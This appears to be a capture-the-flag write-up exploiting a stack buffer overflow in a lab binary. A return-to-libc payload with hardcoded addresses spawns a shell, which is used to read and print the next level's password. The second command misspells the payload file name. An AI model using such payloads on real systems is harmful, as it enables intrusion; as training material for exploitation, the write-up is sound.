# We use gdb, nm and strings on our kali to deeply analyze the target binary.
# We found a reference to system syscall and a buffer.
# We fulfill incrementally the buffer until an overflow is found.
# We then craft our exploit, following the calling convention, with :
#	- a string overflow
#	- the address of the reference to "system" syscall
#	- the address of the reference to "exit" syscall
#	- the address of the string "/bin/sh"

python -c 'print "A"*76 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x29\x88\x04\x08"' > /tmp/payload_level1
cat /tmp/payaload_level1 - | ./level1

cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

